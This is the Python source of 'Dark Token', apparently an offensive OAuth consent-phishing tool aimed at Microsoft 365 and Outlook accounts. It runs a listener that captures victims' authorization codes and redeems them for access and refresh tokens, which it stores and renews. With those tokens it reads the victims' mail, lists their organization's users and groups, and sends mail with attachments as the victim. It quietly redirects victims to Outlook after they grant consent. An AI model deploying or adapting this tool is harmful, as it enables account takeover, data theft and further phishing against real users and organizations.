#!/usr/local/bin/python

# Dark Token 
# Written By: Mr. V (Ring0Labs)

# Dark Token, leveraging the open authentication protocol (oauth) to steal target's information. 

##########################################################################
# Dark Token                                                             #
#                                                                        #
# Copyright 2018 Viet Luu                                                #
#                                                                        #
# This file is part of www.ring0lab.com                                  #
#                                                                        #
# Dark Token is free software; you can redistribute it and/or modify     #
# it under the terms of the GNU General Public License as published by   #
# the Free Software Foundation version 3 of the License.                 #
#                                                                        #
##########################################################################

# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; 
# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
# See the GNU General Public License for more details.

# Please don't use it for bad things!

"""
Requirements: 
valid cert.pem, key.pem. 
create an app at apps.dev.microsoft.com, platform must be web.
"""
# https://outlook.office365.com/
# https://outlook.live.com/

import BaseHTTPServer, httplib, ssl, thread
from BaseHTTPServer import BaseHTTPRequestHandler
import json, logging
from urlparse import urlparse, parse_qs
import urllib, time
import os, base64, mimetypes, ConfigParser
from os import system
from tinydb import TinyDB, Query

SIGNAL = ''
global EMAILDOMAIN
global TOKENS
TOKENS = []
global HTTPD
API = {
	'base': 'https://graph.microsoft.com/',
	'profile': 'v1.0/me',
	'message': 'v1.0/me/messages',
	'users': 'v1.0/users',
	'groups': 'v1.0/groups',
	'mygroups': "v1.0/me/memberOf/$/microsoft.graph.group?$filter=groupTypes/any(a:a%20eq%20'unified')"
}
global CLIENT_IP
APP_CONFIG = {
	'client_id': '',
	'scope': 'openid offline_access people.read user.read profile email mail.read mail.readwrite mail.send',
	'client_secret': '',
	'redirect_uri': ''
	}
CERT_CONFIG = {
	'keyfile': 'key.pem',
	'certfile': 'cert.pem'
}
EMAIL_CONFIG = {
	'subject': '',
	'importance': 'Low',
	'contentType': 'HTML',
	'content': '',
	'address': '',
	'attachments': []
}

help = """

[General]

start server         - To start Dark Token server.
stop server          - To stop Dark Token server.
list tokens          - To list all tokens.
list message ID      - To list email messages from a specific account.
list users ID        - To list users of the target organization.
list groups ID       - To list groups of the target organization.
list my groups ID    - To list assigned groups of the current account.
clear                - To clear screen.

[App Configuration]

show app config      - To list app config
set client_id        - To set client_id      - REQUIRED
set scope            - To set scope
set client_secret    - To set client_secret  - REQUIRED
set redirect_uri     - To set redirect_uri   - REQUIRED
set keyfile          - To set private key file
set certfile         - To set certificate file
generate link        - Generate permission request link
renew token ID       - To generate new access token

[Email Configuration]

show email config    - To list email config
set subject          - To set subject        - REQUIRED
set importance       - To set importance
set contentType      - To set contentType
set content          - To set content        - REQUIRED
set address          - To set rcpt address   - REQUIRED
set attachments      - To set attachments

"""

rows, columns = os.popen('stty size', 'r').read().split()

class colors:
	green = '\x1b[6;30;42m'
	allwhite = '\x1b[0;37;47m'
	white = '\x1b[0;37;40m'
	blue = '\x1b[0;34;40m'
	end = '\x1b[0m'

config_parser = ConfigParser.RawConfigParser()
if os.path.isfile('autorun.cfg'):
	config_file_path = r'autorun.cfg'
	config_parser.read(config_file_path)
	if config_parser.get('app-config', 'client_id'):
		APP_CONFIG['client_id'] = config_parser.get('app-config', 'client_id')
	if config_parser.get('app-config', 'client_secret'):
		APP_CONFIG['client_secret'] = config_parser.get('app-config', 'client_secret')
	if config_parser.get('app-config', 'redirect_uri'):
		APP_CONFIG['redirect_uri'] = config_parser.get('app-config', 'redirect_uri')
else:
	autorun_cfg = open("autorun.cfg",'w')
	config_parser.add_section('app-config')
	config_parser.set('app-config','client_id','')
	config_parser.set('app-config','client_secret','')
	config_parser.set('app-config','redirect_uri','')
	config_parser.write(autorun_cfg)

if os.path.isfile('darktokenDB.json'):
	darktoken_db = TinyDB('darktokenDB.json')
	for token in darktoken_db:
		TOKENS.append([token['account'],token['access_token'],token['id_token'],token['refresh_token'],token['CLIENT_IP']])

class AuthorizationHandler(BaseHTTPRequestHandler):
	def do_GET(self):
		global CLIENT_IP
		global EMAILDOMAIN
		CLIENT_IP = self.client_address[0]
		url_params = urlparse(self.path).query
		if url_params:
			try:
				auth_code = parse_qs(url_params)['code'][0]
			except:
				auth_code = ''
				error = parse_qs(url_params)['error'][0]
			if auth_code:
				get_access_token(auth_code)
				# Redirect target for operation safe.
				self.send_response(307) # StatusTemporaryRedirect
				if EMAILDOMAIN.__contains__('@outlook.com'):
					self.send_header('Location','https://outlook.live.com/')
				else:
					self.send_header('https://outlook.office365.com/')
				self.end_headers()
			elif error == 'access_denied':
				self.send_response(307)
				self.send_header('Location','https://www.office.com/')
				self.end_headers()
				darktoken_msg('[!] %s rejected Dark Token request.' % CLIENT_IP)
	def log_message(self, format, *args):
		return
	def do_POST(self):
		global HTTPD
		if self.path.startswith('/shutdown'):
			darktoken_msg('[!] Shutting down Dark Token Server...')
			def stop_server(server):
				server.shutdown()
				server.server_close()
			thread.start_new_thread(stop_server, (HTTPD,))
			self.send_error(500)

def httpRequest(url, payload, access_token_authorization_bearer=None, method='POST', context=ssl._https_verify_certificates(), headers={'Content-Type': 'application/x-www-form-urlencoded'}):

	if access_token_authorization_bearer:
		headers['Authorization'] = 'Bearer ' + access_token_authorization_bearer
	
	url_parsed = urlparse(url)

	conn = httplib.HTTPSConnection(url_parsed.hostname, context=context)

	try:
		if headers['Content-Type'] == 'application/json':
			conn.request(method=method, url=url_parsed.path, body=json.dumps(payload), headers=headers)
		else:
			conn.request(method=method, url=url_parsed.path, body=urllib.urlencode(payload), headers=headers)
	except:
		conn.request(method=method, url=url_parsed.path, body=payload, headers=headers)

	return conn.getresponse()

def get_access_token(code):
	global EMAILDOMAIN
	payload = {
		'grant_type': 'authorization_code',
 		'client_id': '',
		'scope': '',
		'client_secret': '',
		'redirect_uri': '',
		'code': code
		}

	payload.update(APP_CONFIG)
	resp = httpRequest('https://login.windows.net/common/oauth2/v2.0/token', payload)
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))

	try:
		account = get_account_profile(res_json['access_token'])
		store_token(account['userPrincipalName'], res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
	except:
		EMAILDOMAIN = ''

def refresh_access_token(account, refresh_token, client_ip):
	payload = {
		'grant_type': 'refresh_token',
 		'client_id': APP_CONFIG['client_id'],
		'client_secret': APP_CONFIG['client_secret'],
		'refresh_token': refresh_token
		}

	resp = httpRequest('https://login.windows.net/common/oauth2/v2.0/token', payload)
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))
	
	store_token(account, res_json['access_token'], res_json['id_token'], res_json['refresh_token'], client_ip)

def get_account_profile(access_token):
	global EMAILDOMAIN
	resp = httpRequest(API['base']+API['profile'], '', access_token, 'GET')
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))
	EMAILDOMAIN = res_json['userPrincipalName']

	darktoken_msg('[*] Pwned: Got Access Token for %s - %s' %(res_json['userPrincipalName'], CLIENT_IP + colors.end))
	return res_json

def get_account_messages(access_token):
	resp = httpRequest(API['base']+API['message'], '', access_token, 'GET')
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))
	return res_json

def send_email(access_token):
	payload = {
    "subject": EMAIL_CONFIG['subject'],
    "importance": EMAIL_CONFIG['importance'],
    "body":{
        "contentType": EMAIL_CONFIG['contentType'],
        "content": EMAIL_CONFIG['content']
    },
    "toRecipients":[
        {
            "emailAddress":{
                "address": EMAIL_CONFIG['address']
            }
        }
    ]
	}

	resp = httpRequest(API['base']+API['message'], payload, access_token, headers={'Content-Type': 'application/json'})
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))

	if EMAIL_CONFIG['attachments']:
		for filepath in EMAIL_CONFIG['attachments']:
			filename = os.path.basename(filepath)
			b64_content = base64.b64encode(open(filepath, 'rb').read())
			mime_type = mimetypes.guess_type(filepath)[0]
			add_attachments(access_token, res_json['id'], filename, b64_content, mime_type, headers={'Content-Type': 'application/json'})

	mail = httpRequest(API['base']+API['message']+'/'+res_json['id']+'/send', '', access_token, headers={'Content-Length	': '0'})
	if mail.status == 202:
		darktoken_msg('[*] Email Sent!')

def add_attachments(access_token, message_id, filename, content_bytes, mime_type, headers):
	payload = {
  "@odata.type": "#microsoft.graph.fileAttachment",
  "name": filename,
  "contentBytes": content_bytes.decode('utf-8'),
  "ContentType": mime_type
	}

	resp = httpRequest(API['base']+API['message']+'/'+message_id+'/attachments', payload, access_token, headers=headers)
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))

	if resp.status == 201:
		darktoken_msg('[*] File: [%s] Attached!' % filename)

def get_users(access_token):
	resp = httpRequest(API['base']+API['users'], '', access_token, 'GET')
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))
	return res_json

def get_groups(access_token):
	resp = httpRequest(API['base']+API['groups'], '', access_token, 'GET')
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))
	return res_json

def get_mygroups(access_token):
	resp = httpRequest(API['base']+API['mygroups'], '', access_token, 'GET')
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))
	return res_json
	
def start_server():
	global HTTPD
	if not APP_CONFIG['client_id'] or not APP_CONFIG['client_secret'] or not APP_CONFIG['redirect_uri']:
		darktoken_msg('[!] Please check your app config.')
	else:
		try:
			HTTPD = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), AuthorizationHandler)
			darktoken_msg('[!] Starting Dark Token Server...')
			HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile=CERT_CONFIG['keyfile'], certfile=CERT_CONFIG['certfile'], server_side=True)
			HTTPD.serve_forever()
		except:
			darktoken_msg('[!] Server is already started.')
	
def stop_server():
	try:
		httpRequest('https://127.0.0.1/shutdown', '', context=ssl._create_unverified_context())
	except:
		pass

def store_token(account, access_token, id_token, refresh_token, client_ip=''):
	global TOKENS
	global CLIENT_IP

	if client_ip:
		CLIENT_IP = client_ip

	if TOKENS:
		match = False
		for i in range(len(TOKENS)):
			if TOKENS[i-1][0] == account:
				TOKENS[i-1] = [account, access_token, id_token, refresh_token, CLIENT_IP]
				match = True
		if not match:
			TOKENS.append([account, access_token, id_token, refresh_token, CLIENT_IP])
	else:
		TOKENS.append([account, access_token, id_token, refresh_token, CLIENT_IP])

	darktoken_db = TinyDB('darktokenDB.json')
	token = Query()

	if darktoken_db.search(token.account == account):
		darktoken_db.update({'access_token': access_token, 'id_token': id_token, 'refresh_token': refresh_token, 'CLIENT_IP': CLIENT_IP}, token.account == account)
	else:
		darktoken_db.insert({'account': account, 'access_token': access_token, 'id_token': id_token, 'refresh_token': refresh_token, 'CLIENT_IP': CLIENT_IP})

def darktoken_msg(message):
	logging.basicConfig(filename='darktoken.log',level=logging.DEBUG, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
	logging.Formatter.converter = time.gmtime
	logging.info(message)
	print message

darktoken_msg('[!] Starting Dark Token...')

while True:
	SIGNAL = raw_input('[*]> ')
	if SIGNAL.__contains__('start server'):
		thread.start_new_thread(start_server, ())
	elif SIGNAL.__contains__('stop server'):
		stop_server()
	elif SIGNAL.__contains__('renew token'):
		id = SIGNAL.split()[2]
		darktoken_msg('[+] Trying To Renew Available Tokens: %s' % TOKENS[int(id)][0])
		if TOKENS:
			try:
				refresh_access_token(TOKENS[int(id)][0], TOKENS[int(id)][3], TOKENS[int(id)][4])
				darktoken_msg('[+] Token Renewed Successfully.')
			except:
				darktoken_msg('[!] Unable To Renew Token.')
		else:
			darktoken_msg('[!] 0 Tokens Found In The Database.')
	elif SIGNAL.__contains__('list tokens'):
		darktoken_msg('[!] Listing Available Tokens:')
		try:
			for i in range(len(TOKENS)):
				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
				darktoken_msg('ID = [' + str(i) + '] - Account: ' + TOKENS[i][0])
				darktoken_msg('Access_Token: ' + TOKENS[i][1])
				darktoken_msg('Refresh_token: ' + TOKENS[i][3])
				darktoken_msg('Client IP: ' + TOKENS[i][4])
		except NameError:
			darktoken_msg('[!] 0 Tokens Found In The Database.')
			pass
	elif SIGNAL.__contains__('list users'):
		id = SIGNAL.split()[2]
		try:
			users = get_users(TOKENS[int(id)][1])
			for i in range(len(users['value'])):
				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
				darktoken_msg(colors.white + 'Display Name: ' + str(users['value'][i]['displayName']) + colors.end)
				darktoken_msg(colors.white + 'User Principal Name: ' + str(users['value'][i]['userPrincipalName']) + colors.end)
				darktoken_msg(colors.white + 'Business Phone: ' + str(users['value'][i]['businessPhones']) + colors.end)
				darktoken_msg(colors.white + 'Job Title: ' + str(users['value'][i]['jobTitle']) + colors.end)
				darktoken_msg(colors.white + 'Mail: ' + str(users['value'][i]['mail']) + colors.end)
				darktoken_msg(colors.white + 'Mobile Phone: ' + str(users['value'][i]['mobilePhone']) + colors.end)
				darktoken_msg(colors.white + 'Office Location: ' + str(users['value'][i]['officeLocation']) + colors.end)
		except:
			darktoken_msg('[!] 0 Users Found In The Database.')
	elif SIGNAL.__contains__('list groups'):
		id = SIGNAL.split()[2]
		try:
			groups = get_groups(TOKENS[int(id)][1])
			for i in range(len(groups['value'])):
				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
				darktoken_msg(color.white + str(groups['value'][i]))
		except:
			darktoken_msg('[!] 0 Groups Found In The Database.')
	elif SIGNAL.__contains__('list my groups'):
		id = SIGNAL.split()[3]
		try:
			groups = get_mygroups(TOKENS[int(id)][1])
			for i in range(len(groups['value'])):
				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
				darktoken_msg(color.white + str(groups['value'][i]))
		except:
			darktoken_msg('[!] 0 Groups Found In The Database.')
	elif SIGNAL.__contains__('list message'):
		id = SIGNAL.split()[2]
		try:
			msg = get_account_messages(TOKENS[int(id)][1])
			for i in range(len(msg['value'])):
				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
				darktoken_msg(colors.blue + 'Subject: ' + msg['value'][i]['subject'] + colors.end)
				darktoken_msg(colors.blue + 'Body:' + colors.end)
				darktoken_msg(colors.white + msg['value'][i]['bodyPreview'] + colors.end)
		except NameError:
			darktoken_msg('[!] 0 Messages Found In The Database.')
			pass
	elif SIGNAL.__contains__('send email'):
		id = SIGNAL.split()[2]
		resp = send_email(TOKENS[int(id)][1])
	elif SIGNAL.__contains__('clear'):
		system('clear')
	elif SIGNAL.__contains__('show app config'):
		darktoken_msg("client_id: %s" % str(APP_CONFIG['client_id']))
		darktoken_msg("scope: %s" % str(APP_CONFIG['scope']))
		darktoken_msg("client_secret: %s" % str(APP_CONFIG['client_secret']))
		darktoken_msg("redirect_uri: %s" % str(APP_CONFIG['redirect_uri']))
	elif SIGNAL.__contains__('set client_id'):
		client_id = SIGNAL.split()[2]
		APP_CONFIG['client_id'] = client_id
	elif SIGNAL.__contains__('set scope'):
		scope = SIGNAL.split()[2]
		APP_CONFIG['scope'] = scope
	elif SIGNAL.__contains__('set client_secret'):
		client_secret = SIGNAL.split()[2]
		APP_CONFIG['client_secret'] = client_secret
	elif SIGNAL.__contains__('set redirect_uri'):
		redirect_uri = SIGNAL.split()[2]
		APP_CONFIG['redirect_uri'] = redirect_uri
	elif SIGNAL.__contains__('generate link'):
		try:
			darktoken_msg("\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=%s&response_mode=query&scope=%s&state=12345\n" % (str(APP_CONFIG['client_id']), urllib.quote(APP_CONFIG['redirect_uri']), urllib.quote(APP_CONFIG['scope'])))
		except:
			pass
	elif SIGNAL.__contains__('show email config'):
		darktoken_msg("subject: %s" % str(EMAIL_CONFIG['subject']))
		darktoken_msg("importance: %s" % str(EMAIL_CONFIG['importance']))
		darktoken_msg("contentType: %s" % str(EMAIL_CONFIG['contentType']))
		darktoken_msg("content: %s" % str(EMAIL_CONFIG['content']))
		darktoken_msg("recipient address: %s" % str(EMAIL_CONFIG['address']))
		for filepath in EMAIL_CONFIG['attachments']:
			darktoken_msg("Attachment [%s]: [%s]" % (str(EMAIL_CONFIG['attachments'].index(filepath)+1), str(filepath)))
	elif SIGNAL.__contains__('set subject'):
		subject = raw_input('Subject: ')
		EMAIL_CONFIG['subject'] = subject
	elif SIGNAL.__contains__('set importance'):
		importance = SIGNAL.split()[2]
		EMAIL_CONFIG['importance'] = importance
	elif SIGNAL.__contains__('set contentType'):
		contentType = SIGNAL.split()[2]
		EMAIL_CONFIG['contentType'] = contentType
	elif SIGNAL.__contains__('set content'):
		content = raw_input('Body: ')
		EMAIL_CONFIG['content'] = content
	elif SIGNAL.__contains__('set address'):
		address = SIGNAL.split()[2]
		EMAIL_CONFIG['address'] = address
	elif SIGNAL.__contains__('set attachments'):
		darktoken_msg('Paste your file location, one per line. When you\'re finished, press enter on an empty line')
		file = 'None'
		while file:
			file = raw_input('File Location: ')
			if file:
				EMAIL_CONFIG['attachments'].append(file)
	elif SIGNAL.__contains__('help'):
		print help
	elif not SIGNAL:
		pass
	elif SIGNAL.__contains__('exit'):
		break
	else:
		darktoken_msg("[!] Unknown Command. '%s' - Type help." % str(SIGNAL))